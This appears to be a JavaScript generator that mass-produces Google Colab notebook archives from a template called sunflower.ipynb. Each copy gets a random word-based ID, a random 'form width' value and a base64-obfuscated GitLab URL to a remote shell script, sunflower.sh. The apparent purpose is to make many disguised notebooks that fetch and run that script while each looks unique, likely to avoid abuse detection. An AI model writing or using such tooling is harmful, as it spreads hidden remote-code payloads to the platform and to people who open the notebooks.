const file_count = 5

$(document).ready(function () {
    console.log("ready!");

    $('#generate-button').click(function () {
        generate($('#archive-count').val())
    })
});

function generate(archive_count) {
    console.log('Generating ' + archive_count + ' archives.')

    fetch('sunflower/sunflower.ipynb')
        .then(resp => resp.json())
        .then(data => {
            let input_file = JSON.stringify(data)
            console.log(input_file)

            for (let archive = 1; archive <= archive_count; archive++) {
                let zip = new JSZip();

                for (let i = 0; i < file_count; i++) {
                    const xhttp = new XMLHttpRequest();
                    xhttp.open("GET", "https://random-word-api.herokuapp.com/word?number=5", false);
                    xhttp.send();

                    const response = JSON.parse(xhttp.responseText)
                    const id = response[0] + '-' + response[1] + '-' + response[2] + '-' + response[3] + '-' + response[4]

                    const placeholder_name = "_id_", hash_url_name = "_url_", form_width_name = "_form_width_"

                    const url_hash = btoa(`https://gitlab.com/white-sagittarius/sunflower/-/raw/main/sunflower.sh?salt=${id}`)

                    let output_file = input_file.replaceAll(form_width_name, Math.floor(Math.random() * 5000).toString())
                        .replaceAll(placeholder_name, id)
                        .replaceAll(hash_url_name, url_hash)
                    console.log(output_file)

                    zip.file(id + '.ipynb', output_file)
                }

                zip.generateAsync({type: "blob"})
                    .then(function (blob) {
                        saveAs(blob, 'colab ' + archive + ' .zip');
                    });
            }

        })
        .catch((e) => alert('Oh no! Some error happened: ' + e.toString()));
}